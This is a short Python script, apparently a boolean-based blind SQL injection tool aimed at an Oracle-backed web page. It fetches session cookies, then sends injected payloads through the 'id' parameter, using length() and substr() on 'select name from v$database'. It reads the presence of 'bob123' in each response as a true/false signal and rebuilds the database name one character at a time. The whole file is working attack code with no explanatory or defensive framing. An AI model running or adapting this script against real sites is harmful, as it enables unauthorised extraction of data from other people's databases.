import requests

def GetCookies(urlLogin):
    session = requests.session()
    session.get(urlLogin, data={"id":"bob"})
    return session.cookies.get_dict()

def GetLengthOfDatabaseName(urlTarget, cookies):
    for i in range(1,21):
        r = requests.get(urlTarget+"?id=bob%27%20and%20length(((select%20name%20from%20v$database)))="+str(i)+"%20or%20%27a%27=%27b",cookies=cookies)
        if "bob123" in r.text:
            return i

def GetDatabaseName(urlTarget, cookies, lengthOfDatabaseName):
    databaseName =""
    for i in range(1, lengthOfDatabaseName + 1):
        for j in range(32, 128):
            r = requests.get(urlTarget+"?id=bob%27%20and%20substr(((select%20name%20from%20v$database)),"+str(i)+",1)='"+chr(j)+"'%20or%20%27a%27=%27b",cookies=cookies)
            if "bob123" in r.text:
                databaseName += chr(j)
                break
    return databaseName

if __name__ =="__main__":
    urlTarget = "targetURL"

    cookies = GetCookies(urlTarget)
    print("cookies:: ",cookies)
    lengthOfDatabaseName = GetLengthOfDatabaseName(urlTarget, cookies)
    print("length of database name:: ",lengthOfDatabaseName)
    databaseName = GetDatabaseName(urlTarget, cookies, lengthOfDatabaseName)
    print("database name:: "+databaseName)
